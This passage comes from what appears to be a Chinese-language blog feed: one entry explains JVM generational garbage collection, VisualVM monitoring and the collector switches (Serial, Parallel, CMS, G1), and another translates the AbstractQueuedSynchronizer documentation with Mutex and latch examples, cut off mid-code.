<p>年轻代是所有新对象被分配和老化的地方。当年轻代填满时，这会导致Minor GC。假设对象死亡率很高，可以优化次要集合。一个充满死亡对象的年轻代很快就会被收集起来。一些幸存的对象被老化并最终移动到老年代。</p>
<p>Stop the World Event——所有Minor GC都是“STW”事件。这意味着所有应用程序线程都将停止，直到操作完成。Minor GC始终是 STW 事件。</p>
<p>老年代用于存储长期存活的对象。通常，为年轻代对象设置一个阈值，当满足该年龄时，该对象将移动到老年代。最终需要收集老年代。此事件称为Major GC。</p>
<p>Major GC也是 STW 事件。通常一个Major GC要慢得多，因为它涉及所有活动对象。因此，对于响应式应用程序，应尽量减少Major GC。另请注意，Major GC的 STW 事件的长度受用于老年代空间的垃圾收集器类型的影响。</p>
<p>永久代包含 JVM 所需的元数据，用于描述应用程序中使用的类和方法。 JVM 在运行时根据应用程序使用的类填充永久代。此外，Java SE 库类和方法可能存储在这里。</p>
<p>如果 JVM 发现不再需要这些类并且其他类可能需要空间，则这些类可能会被收集（卸载）。永久代包含在完整的垃圾收集中。</p>
<h1 id="分代垃圾收集过程"><a href="#分代垃圾收集过程" class="headerlink" title="分代垃圾收集过程"></a>分代垃圾收集过程</h1><p>现在您了解了为什么堆被分成不同的代，是时候看看这些空间究竟是如何相互作用的了。下面的图片介绍了 JVM 中的对象分配和老化过程。</p>
<ol>
<li><p>首先，任何新对象都被分配到伊甸园空间。两个幸存者空间一开始都是空的。<br><img src="https://img-blog.csdnimg.cn/img_convert/b604e4ca588de8c1b0c7d7a6c62853ad.png" alt="Object Allocation"></p>
</li>
<li><p>当Eden空间填满时，会触发minor GC。<br><img src="https://img-blog.csdnimg.cn/img_convert/556642656cd1142005b7e77375ad2bcd.png" alt="Filling the Eden Space"></p>
</li>
<li><p>被引用的对象被移动到第一个Survivor空间。当Eden空间被清除时，未引用的对象将被删除。<br><img src="https://img-blog.csdnimg.cn/img_convert/0902a269f8853ac169923a6146f6de6d.png" alt="Copying Referenced Objects"></p>
</li>
<li><p>在下一次minor GC 中，同样的事情发生在Eden空间。未引用的对象被删除，被引用的对象被移动到survivor空间。然而，在这种情况下，它们被移动到第二个Survivor空间（S1）。此外，来自第一个survivor空间 (S0) 上的最后一次minor  GC 的对象的年龄增加并被移动到 S1。一旦所有幸存的对象都被移动到 S1，S0 和 eden 都将被清除。请注意，我们现在在survivor空间中有不同年龄的对象。<br><img src="https://img-blog.csdnimg.cn/img_convert/b3cf3eaf1f36262fe68dcf7ed61951e7.png" alt="Object Aging"></p>
</li>
</ol>
<p>5.在下一次minor GC 中，重复相同的过程。然而，这一次survivor空间切换。被引用的对象被移动到 S0。幸存的物体会老化。 Eden 和 S1 被清除。<br><img src="https://img-blog.csdnimg.cn/img_convert/f9ba5638b8c31898df43827c09d5fdb5.png" alt="Additional Aging"></p>
<ol>
<li><p>在一次 minor GC 之后，当老化对象达到某个年龄阈值（本例中为 8）时，它们会从年轻代提升到老年代。<br><img src="https://img-blog.csdnimg.cn/img_convert/fb573a5699026c4b84752db60336c334.png" alt="Promotion"></p>
</li>
<li><p>随着 Minor GC 的不断发生，对象将继续被提升到老年代空间。<br><img src="https://img-blog.csdnimg.cn/img_convert/4b65067ce7e38bc499cd698dd48e0cc2.png" alt="Promotion 2"></p>
</li>
<li><p>所以这几乎涵盖了年轻一代的整个过程。最终，将在老年代执行一次major GC，清理并压缩该空间。<br><img src="https://img-blog.csdnimg.cn/img_convert/e934cf0d694a7b38a63b7ac73452709b.png" alt="GC Process Summary"></p>
</li>
</ol>
<h1 id="进行自己的观察"><a href="#进行自己的观察" class="headerlink" title="进行自己的观察"></a>进行自己的观察</h1><h2 id="概览-1"><a href="#概览-1" class="headerlink" title="概览"></a>概览</h2><p>您已经使用一系列图片看到了垃圾收集过程。现在是时候现场体验和探索这个过程了。在本活动中，您将运行 Java 应用程序并使用 Visual VM 分析垃圾收集过程。 Visual VM 程序包含在 JDK 中，允许开发人员监控正在运行的 JVM 的各个方面。</p>
<h2 id="动手活动"><a href="#动手活动" class="headerlink" title="动手活动"></a>动手活动</h2><h3 id="第-1-步：初始设置"><a href="#第-1-步：初始设置" class="headerlink" title="第 1 步：初始设置"></a>第 1 步：初始设置</h3><p>下载demo</p>
<h3 id="第-2-步：启动演示应用程序"><a href="#第-2-步：启动演示应用程序" class="headerlink" title="第 2 步：启动演示应用程序"></a>第 2 步：启动演示应用程序</h3><p>安装 Java JDK 和演示后，您现在可以运行将在本活动中分析的演示应用程序。对于此示例，演示安装在 c:\javademos 中。</p>
<p>演示应用程序是一个 2D 图形演示。要执行它，请键入：<br><code>java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseSerialGC -jar c:\javademos\demo\jfc\Java2D\Java2demo.jar</code><br><img src="https://img-blog.csdnimg.cn/img_convert/bf7309bfb7239f5b618907ad30105e0e.png" alt="2D Demo"></p>
<h3 id="第-3-步：启动-VisualVM"><a href="#第-3-步：启动-VisualVM" class="headerlink" title="第 3 步：启动 VisualVM"></a>第 3 步：启动 VisualVM</h3><p>要启动 Visual VM，请使用 C:\Program Files\Java\jdk1.7.0_XX\bin 目录中的 jvisualvm 可执行文件。我建议您将此目录添加到您的路径中。在 Windows 7 上，步骤如下：Start -&gt; Computer -&gt; System Properties -&gt; Advanced System Settings -&gt; Environment Variables.然后在系统变量下选择路径并添加 C:\Program Files\Java\jdk1.7.0_XX\bin;到路径（其中 XX 是 JDK 的当前版本）。单击确定几次，然后关闭对话框。</p>
<p>完成此操作后，您应该能够打开命令提示符窗口并键入 jvisualvm。</p>
<p>Visual VM 第一次运行时，它会对您的系统进行校准。您将看到如下消息：<br><img src="https://img-blog.csdnimg.cn/img_convert/9a84734e9fa8fa96cad3cfdcb4659e3c.png" alt=""></p>
<p>然后是这样的消息：<br><img src="https://img-blog.csdnimg.cn/img_convert/03d9300391e82c91293b120780a0dc5f.png" alt=""></p>
<p>最后加载主用户界面。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2d2d9f6fdfb4676deb08c6f32d34415a.png" alt=""></p>
<p>从这里，我们可以监控正在运行的 JVM。但是，对于这个活动，我们需要添加 VisualGC 插件。</p>
<h3 id="第-4-步：安装-Visual-GC"><a href="#第-4-步：安装-Visual-GC" class="headerlink" title="第 4 步：安装 Visual GC"></a>第 4 步：安装 Visual GC</h3><p>Visual VM 的 Visual GC 插件提供了 JVM 中垃圾收集器活动的图形表示。它是免费的，可以按照以下步骤添加到您的安装中。</p>
<ol>
<li>要安装 Visual GC，请从菜单中选择Tools —&gt; Plugins。您应该得到以下对话框。<br><img src="https://img-blog.csdnimg.cn/img_convert/ab74d445b5f9bd3f90b354714f14ba96.png" alt=""><br>2.选择 Visual GC，然后选择安装按钮。<br><img src="https://img-blog.csdnimg.cn/img_convert/413d999e82f5c33851f9df965144718e.png" alt=""><br>3.插件安装程序启动。点击下一步。<br><img src="https://img-blog.csdnimg.cn/img_convert/28068ed012fb3c7e2d150830fc0041ca.png" alt=""></li>
<li>阅读并接受许可协议。单击安装。现在将安装插件。<br><img src="https://img-blog.csdnimg.cn/img_convert/04421c4b825e0a8cd5eba3dd3a15ff3c.png" alt=""><br>5.该插件现已安装。单击完成以完成安装。<br><img src="https://img-blog.csdnimg.cn/img_convert/1ff2d568ef712ee9a069cfbef199dfc5.png" alt=""><br>6.单击关闭按钮关闭插件对话框。<br>安装了 VisualGC。现在我们可以检查 Java2Demo 以了解正在发生的事情。</li>
</ol>
<h3 id="第-5-步：分析-Java2Demo"><a href="#第-5-步：分析-Java2Demo" class="headerlink" title="第 5 步：分析 Java2Demo"></a>第 5 步：分析 Java2Demo</h3><p>是时候分析我们在第 2 步中启动的应用程序了。</p>
<ol>
<li>首先，在 Applications 选项卡的 Local applications 列表中右键单击 Java2Demo 应用程序。选择打开。<br><img src="https://img-blog.csdnimg.cn/img_convert/879dfa3d9076eb223b996ce0bed907a9.png" alt=""></li>
<li>应用程序被加载到 Visual VM 中。请注意，界面右侧加载了许多选项卡。单击可视 GC 选项卡。<br><img src="https://img-blog.csdnimg.cn/img_convert/47d31ee5532ba4cb3fde448792cce24a.png" alt=""><br>3.Visual GC 选项卡显示垃圾收集器中正在进行的所有活动。您可以看到 Eden 空间被填满，数据在两个survivor空间 S1 和 S0 之间移动。此外，右侧显示了与垃圾收集器相关的图表和统计信息。<br><img src="https://img-blog.csdnimg.cn/img_convert/1ab0185c3b653bc5c2e8ecf9e38c432b.png" alt=""><br>随意尝试其他选项卡并查看有关 JVM 的信息。此外，您可以尝试更改示例应用程序中显示的字符串或图像的数量，以了解这对垃圾收集过程有何影响。</li>
</ol>
<h1 id="Java-垃圾收集器"><a href="#Java-垃圾收集器" class="headerlink" title="Java 垃圾收集器"></a>Java 垃圾收集器</h1><p>您现在了解了垃圾收集的基础知识，并且已经观察了垃圾收集器在示例应用程序中的作用。在本节中，您将了解可用于 Java 的垃圾收集器以及选择它们所需的命令行开关。</p>
<h2 id="常见的堆相关开关"><a href="#常见的堆相关开关" class="headerlink" title="常见的堆相关开关"></a>常见的堆相关开关</h2><p>Java 可以使用许多不同的命令行开关。本节介绍了本 OBE 中也使用的一些更常用的开关。<br>| 开关   |  描述   |<br>| — | — |<br>|  -Xms  |  设置 JVM 启动时的初始堆大小。   |<br>|  -Xmx  |  设置最大堆大小。   |<br>|  -Xmn  |  设置年轻代的大小。   |<br>|  -XX:PermSize  |  设置永久代的起始大小。   |<br>|  -XX:MaxPermSize  |  设置永久代的最大大小。   | </p>
<h2 id="串行收集器-Serial-GC"><a href="#串行收集器-Serial-GC" class="headerlink" title="串行收集器(Serial GC)"></a>串行收集器(Serial GC)</h2><p>串行收集器是 Java SE 5 和 6 中客户端样式机器的默认设置。使用串行收集器，次要和主要垃圾收集都是串行完成的（使用单个虚拟 CPU）。此外，它使用了一种标记紧凑的收集方法。此方法将较旧的内存移动到堆的开头，以便在堆的末尾将新的内存分配变成一个连续的内存块。这种内存压缩可以更快地将新的内存块分配给堆。</p>
<h3 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h3><p>对于大多数对暂停时间要求不高且在客户端式机器上运行的应用程序来说，串行 GC 是首选的垃圾收集器。它仅利用单个虚拟处理器进行垃圾收集工作（因此，它的名字）。尽管如此，在今天的硬件上，串行 GC 可以有效地管理大量具有几百 MB Java 堆的重要应用程序，并且在最坏情况下的暂停时间相对较短（完全垃圾收集大约需要几秒钟）。</p>
<p>Serial GC 的另一个流行用途是在同一台机器上运行大量 JVM 的环境中（在某些情况下，JVM 比可用处理器多！）。在这样的环境中，当 JVM 进行垃圾收集时，最好只使用一个处理器来最大限度地减少对剩余 JVM 的干扰，即使垃圾收集可能会持续更长时间。串行 GC 非常适合这种权衡。</p>
<p>最后，随着具有最小内存和少数内核的嵌入式硬件的普及，串行 GC 可能会卷土重来。</p>
<h3 id="命令行开关"><a href="#命令行开关" class="headerlink" title="命令行开关"></a>命令行开关</h3><p>要启用串行收集器，请使用：<code>-XX:+UseSerialGC</code><br>下面是启动 Java2Demo 的示例命令行：<br><code>java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseSerialGC -jar c:\javademos\demo\jfc\Java2D\Java2demo.jar</code></p>
<h2 id="并行垃圾收集器-Parallel-GC"><a href="#并行垃圾收集器-Parallel-GC" class="headerlink" title="并行垃圾收集器(Parallel GC)"></a>并行垃圾收集器(Parallel GC)</h2><p>并行垃圾收集器使用多个线程来执行年轻代垃圾收集。默认情况下，在具有 N 个 CPU 的主机上，并行垃圾收集器在收集中使用 N 个垃圾收集器线程。垃圾收集器线程的数量可以通过命令行选项控制：</p>
<p>-XX:ParallelGCThreads=&lt;所需数量&gt;</p>
<p>在具有单个 CPU 的主机上，即使已请求并行垃圾收集器，也会使用默认垃圾收集器。在具有两个 CPU 的主机上，并行垃圾收集器的性能通常与默认垃圾收集器一样好，并且可以预期在具有两个以上 CPU 的主机上减少年轻代垃圾收集器的暂停时间。 Parallel GC 有两种风格。</p>
<h3 id="使用案例-1"><a href="#使用案例-1" class="headerlink" title="使用案例"></a>使用案例</h3><p>并行收集器也称为吞吐量收集器。因为它可以使用多个 CPU 来加快应用程序的吞吐量。当需要完成大量工作并且可以接受长时间的停顿时，应该使用此收集器。例如，打印报告或账单或执行大量数据库查询等批处理。</p>
<h3 id="XX-UseParallelGC"><a href="#XX-UseParallelGC" class="headerlink" title="-XX:+UseParallelGC"></a>-XX:+UseParallelGC</h3><p>使用此命令行选项，您将获得一个多线程年轻代收集器和一个单线程老年代收集器。该选项还对老年代进行单线程压缩。</p>
<p>下面是启动 Java2Demo 的示例命令行：<br><code>java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseParallelGC -jar c:\javademos\demo\jfc\Java2D\Java2demo.jar</code></p>
<h3 id="XX-UseParallelOldGC"><a href="#XX-UseParallelOldGC" class="headerlink" title="-XX:+UseParallelOldGC"></a>-XX:+UseParallelOldGC</h3><p>使用 -XX:+UseParallelOldGC 选项，GC 既是多线程年轻代收集器，也是多线程老年代收集器。它也是一个多线程压缩收集器。 HotSpot 只在老年代进行压缩。 HotSpot 中的年轻代被认为是一个副本收集器；因此，不需要压缩。</p>
<p>压缩描述了以对象之间没有孔的方式移动对象的行为。垃圾收集扫描后，活动对象之间可能会留下空洞。压实移动对象，以便没有剩余的孔。垃圾收集器可能是非压缩收集器。因此，并行收集器和并行压缩收集器之间的区别可能是后者在垃圾收集扫描后压缩空间。前者不会。</p>
<p>下面是启动 Java2Demo 的示例命令行：<br><code>java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseParallelOldGC -jar c:\javademos\demo\jfc\Java2D\Java2demo.jar</code></p>
<h2 id="并发标记扫描收集器-CMS"><a href="#并发标记扫描收集器-CMS" class="headerlink" title="并发标记扫描收集器 (CMS)"></a>并发标记扫描收集器 (CMS)</h2><p>Concurrent Mark Sweep (CMS) 收集器（也称为并发低暂停收集器）收集老年代。它试图通过与应用程序线程同时进行大部分垃圾收集工作来最小化由于垃圾收集而导致的暂停。通常并发低暂停收集器不会复制或压缩活动对象。垃圾收集是在不移动活动对象的情况下完成的。如果碎片成为问题，请分配更大的堆。</p>
<p>注意：年轻代的 CMS 收集器使用与并行收集器相同的算法。</p>
<h3 id="使用案例-2"><a href="#使用案例-2" class="headerlink" title="使用案例"></a>使用案例</h3><p>CMS 收集器应该用于需要低暂停时间并且可以与垃圾收集器共享资源的应用程序。示例包括响应事件的桌面 UI 应用程序、响应请求的 Web 服务器或响应查询的数据库。</p>
<h3 id="命令行开关-1"><a href="#命令行开关-1" class="headerlink" title="命令行开关"></a>命令行开关</h3><p>要启用 CMS 收集器，请使用：<br><code>-XX:+UseConcMarkSweepGC</code><br>并设置线程数使用：<br><code>-XX:ParallelCMSThreads=&lt;n&gt;</code></p>
<p>下面是启动 Java2Demo 的示例命令行：<br><code>java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseConcMarkSweepGC -XX:ParallelCMSThreads=2 -jar c:\javademos\demo\jfc\Java2D\Java2demo.jar</code></p>
<h3 id="G1-垃圾收集器"><a href="#G1-垃圾收集器" class="headerlink" title="G1 垃圾收集器"></a>G1 垃圾收集器</h3><p>Garbage First 或 G1 垃圾收集器在 Java 7 中可用，旨在长期替代 CMS 收集器。 G1 收集器是一个并行、并发和增量压缩的低暂停垃圾收集器，它的布局与前面描述的其他垃圾收集器完全不同。但是，详细讨论超出了本 OBE 的范围。</p>
<h3 id="命令行开关-2"><a href="#命令行开关-2" class="headerlink" title="命令行开关"></a>命令行开关</h3><p>要启用 G1 收集器，请使用：<br><code>-XX:+UseG1GC</code></p>
<p>下面是启动 Java2Demo 的示例命令行：<br><code>java -Xmx12m -Xms3m -XX:+UseG1GC -jar c:\javademos\demo\jfc\Java2D\Java2demo.jar</code></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在本 OBE 中，您将了解 Java JVM 上的垃圾收集系统。首先，您了解了堆和垃圾收集器如何成为任何 Java JVM 的关键部分。自动垃圾收集是使用分代垃圾收集方法完成的。一旦你了解了这个过程，你就可以使用 Visual VM 工具观察它。最后，您查看了 Java Hospot JVM 中可用的垃圾收集器。</p>
<p>在本教程中，您学习了：</p>
<ul>
<li>Java JVM 的组件</li>
<li>自动垃圾收集的工作原理</li>
<li>分代垃圾收集过程</li>
<li>如何使用 Visual VM 监控 JVM</li>
<li>JVM 上可用的垃圾收集器类型</li>
</ul>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> gc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[AbstractQueuedSynchronizer详解]]></title>
      <url>/2020/aqs-01/</url>
      <content type="html"><![CDATA[<p>AbstractQueuedSynchronizer提供一个框架，用于实现依赖于先进先出（FIFO）等待队列的阻塞锁和相关的同步器（semaphores(信号量)，events(事件)等）。</p>
<a id="more"></a>
<p>这个类旨在为大多数依赖单个原子int值表示state的同步器提供有用的基础。子类必须定义更改此state的protected方法，并定义该state对于获取或释放此对象而言意味着什么。鉴于这些，此类中的其他方法将执行所有排队和阻塞机制。子类可以维护其他状态字段，但仅跟踪使用getState，setState，compareAndSetState方法进行原子更新的int值的同步性。</p>
<p>子类应该定义为用于实现其封闭类的同步属性的非public内部帮助器类。类AbstractQueuedSynchronizer没有实现任何同步接口。相反，它定义了acquireInterruptible之类的方法，可以通过具体的锁和相关的同步器适当地调用这些方法来实现其public方法。</p>
<p>此类支持默认exclusive（互斥）模式和shared（共享）模式之一或两者。当以exclusive方式进行获取时，其他线程尝试进行的获取将无法成功。由多个线程获取的shared模式可能（但不一定）成功。该类不理解这些差异，只是从机械意义上说，当成功获取shared模式时，下一个等待线程（如果存在）也必须确定它是否也可以获取。在不同模式下等待的线程共享相同的FIFO队列。通常，实现子类仅支持这些模式之一，但在ReadWriteLock中两者（exclusive和shared）都发挥了作用。仅支持exclusive模式或仅支持shared模式的子类无需定义支持未使用模式的方法。</p>
<p>此类定义了一个嵌套的ConditionObject类，该类可以被支持exclusive模式的子类用作Condition实现，为此方法isHeldExclusively报告是否针对当前线程专有地保持同步，使用getState当前值调用的方法release会完全释放此对象，并且给定已保存的状态值，acquire最终会将此对象恢复为先前的获取状态。否则，没有AbstractQueuedSynchronizer方法会创建这样的条件，因此，如果无法满足此约束，请不要使用它。 ConditionObject的行为当然取决于其同步器实现的语义。</p>
<p>此类提供了内部队列的检查，检测和监视方法，以及条件对象的类似方法。可以根据需要使用AbstractQueuedSynchronizer将它们导出到类中以实现其同步机制。</p>
<p>此类的序列化仅存储基础原子整数维护状态，因此反序列化的对象具有空线程队列。需要可序列化的典型子类将定义一个readObject方法，该方法可在反序列化时将其恢复为已知的初始状态。</p>
<p>用法</p>
<p>要将此类用作同步器的基础，请使用getState，setState，compareAndSetState重新定义以下方法：</p>
<p>tryAcquire</p>
<p>tryRelease</p>
<p>tryAcquireShared</p>
<p>tryReleaseShared</p>
<p>isHeldExclusively</p>
<p>默认情况下，这些方法中的每一个都会引发UnsupportedOperationException。这些方法的实现必须在内部是线程安全的，并且通常应简短且不阻塞。定义这些方法是<strong>仅仅</strong>支持的使用此类的方法。所有其他方法都声明为final，因为它们不能独立变化。</p>
<p>您可能还会发现从AbstractOwnableSynchronizer继承的方法对于跟踪拥有独占同步器的线程很有用。鼓励您使用它们<br>-这使监视和诊断工具可以帮助用户确定哪些线程持有锁。</p>
<p>即使此类基于内部FIFO队列，它也不会自动执行FIFO获取策略。exclusive同步的核心采取以下形式：</p>
<p>Acquire:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!tryAcquire(arg)) &#123;</span><br><span class="line"> <span class="comment">// 排队线程（如果尚未排队）</span></span><br><span class="line"> <span class="comment">// 可能阻止当前线程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Release:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tryRelease(arg)) &#123;</span><br><span class="line"> <span class="comment">// 释放阻止第一个排队的线程</span></span><br><span class="line"> <span class="comment">// 共享模式相似，但可能涉及级联信号。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为获取队列中的获取检查是在排队之前被调用的，所以新获取线程可能会在被阻塞和排队的其他线程之前<strong>插入</strong>。但是，如果需要，您可以定义tryAcquire和/或tryAcquireShared以通过内部调用一种或多种检查方法来禁用插入，从而提供一个<strong>fair(公平)</strong> FIFO获取顺序。特别是，如果hasQueuedPredecessors（一种专门为公平同步器设计的方法）返回true，则大多数公平同步器都可以定义tryAcquire以返回false。其他变化也是可能的。</p>
<p>吞吐量和可扩展性通常是<br>默认插入（也称为<strong>greedy(贪心) </strong>，<strong>renouncement(放弃)</strong>和<strong>convoy-avoidance(避免车队)</strong>）策略。尽管不能保证这是公平的，也可以避免饥饿，但允许在较早排队的线程在较晚排队的线程之前进行重新竞争，并且每个重新争用都可以毫无偏向地成功抵御传入线程。同样，尽管获取不是通常意义上的旋转，但它们可能会在阻塞之前执行tryAcquire的多次调用，并插入其他计算。当仅短暂地保持排他同步时，这将提供旋转的大部分好处，而在不进行排他同步时，则不会带来很多负担。如果需要的话，您可以通过在调用之前对获取方法进行“快速路径”检查来增强此功能，可能会预先检查hasContended和/或hasQueuedThreads以仅在同步器可能不这样做的情况下这样做争辩。</p>
<p>此类为同步提供了有效且可扩展的基础，部分原因是通过将其使用范围专门用于可以依靠int状态，获取和释放参数以及内部FIFO等待队列的同步器。如果不足够，则可以使用java.util.concurrent.atomic atomic类，您自己的自定义java.util.Queue类和LockSupport阻止从较低级别构建同步器支持。</p>
<p>使用范例</p>
<p>这是一个不可重入的互斥锁定类，使用值0表示解锁状态，使用值1表示锁定状态。 尽管不可重入锁并不严格要求记录当前所有者线程，但是无论如何，此类都这样做以使使用情况更易于监视。 它还支持条件并公开一种检测方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mutex</span> <span class="keyword">implements</span> <span class="title">Lock</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 我们内部的帮助类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Sync</span> <span class="keyword">extends</span> <span class="title">AbstractQueuedSynchronizer</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 报告是否处于锁定状态</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isHeldExclusively</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> getState() == <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">// 如果状态为零，则获取锁</span></span><br><span class="line">    	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">    		<span class="keyword">assert</span> acquires == <span class="number">1</span>; <span class="comment">// 否则未使用</span></span><br><span class="line">    		<span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">    		    setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">    		    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    		&#125;</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="comment">//通过将状态设置为零来释放锁定</span></span><br><span class="line">    	<span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> releases)</span> </span>&#123;</span><br><span class="line">    	    <span class="keyword">assert</span> releases == <span class="number">1</span>; <span class="comment">// 否则未使用</span></span><br><span class="line">    	    <span class="keyword">if</span> (getState() == <span class="number">0</span>) <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">    	    setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">    	    setState(<span class="number">0</span>);</span><br><span class="line">    	    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="comment">// 提供条件</span></span><br><span class="line">    	<span class="function">Condition <span class="title">newCondition</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">new</span> ConditionObject(); &#125;</span><br><span class="line">    	</span><br><span class="line">    	<span class="comment">// 正确反序列化</span></span><br><span class="line">    	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    		<span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    		s.defaultReadObject();</span><br><span class="line">    		setState(<span class="number">0</span>); <span class="comment">// 重置到未锁定状态</span></span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// The sync object does all the hard work. We just forward to it.</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Sync sync = <span class="keyword">new</span> Sync();</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span>                </span>&#123; sync.acquire(<span class="number">1</span>); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">()</span>          </span>&#123; <span class="keyword">return</span> sync.tryAcquire(<span class="number">1</span>); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span>              </span>&#123; sync.release(<span class="number">1</span>); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Condition <span class="title">newCondition</span><span class="params">()</span>   </span>&#123; <span class="keyword">return</span> sync.newCondition(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isLocked</span><span class="params">()</span>         </span>&#123; <span class="keyword">return</span> sync.isHeldExclusively(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasQueuedThreads</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> sync.hasQueuedThreads(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lockInterruptibly</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    	sync.acquireInterruptibly(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">(<span class="keyword">long</span> timeout, TimeUnit unit)</span></span></span><br><span class="line"><span class="function">		<span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> sync.tryAcquireNanos(<span class="number">1</span>, unit.toNanos(timeout));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个类似于java.util.concurrent.CountDownLatch的闩锁类，只不过它只需要触发一个signal即可。 由于闩锁是非排他性的，因此它使用shared获取和释放方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BooleanLatch</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Sync</span> <span 